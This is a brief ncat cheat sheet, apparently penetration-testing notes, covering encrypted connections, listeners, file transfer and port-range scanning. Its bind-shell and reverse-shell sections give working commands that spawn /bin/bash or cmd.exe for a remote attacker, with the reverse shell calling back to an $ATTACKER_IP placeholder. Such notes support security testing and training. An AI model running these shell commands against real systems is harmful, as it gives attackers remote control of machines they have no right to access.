# ncat

Allows for encrypted and authenticated TCP or UDP connections to ports on other hosts

## Connect

```bash
ncat -nv $REMOTE_IP $REMOTE_PORT --ssl
```

## Listen

```bash
ncat -nlvp $REMOTE_PORT --ssl
```

## File Transfer

```bash
ncat -nv $REMOTE_IP $REMOTE_PORT -ssl < $FILE
```

## File Reception

```bash
ncat -nlvp $REMOTE_PORT -ssl > $FILE
```

## Bind Shell

- Target:

```bash
ncat -e [/bin/bash or cmd.exe] [--allow $ATTACKER_IP] -nlvp $TARGET_LISTEN_PORT --ssl
```

- Attacker:

```bash
ncat -nv $TARGET_IP $TARGET_LISTEN_PORT --ssl
```

## Reverse Shell

- Attacker:

```bash
ncat -nlvp $ATTACKER_LISTEN_PORT --ssl
```

- Target:

```bash
ncat -nv $ATTACKER_IP $ATTACKER_LISTEN_PORT --ssl -e [/bin/bash or cmd.exe]
```

## Scan a range of ports

```bash
ncat -nv $REMOTE_IP $PORT_RANGE --ssl
```

- PORT_RANGE example:
  - 1-65535
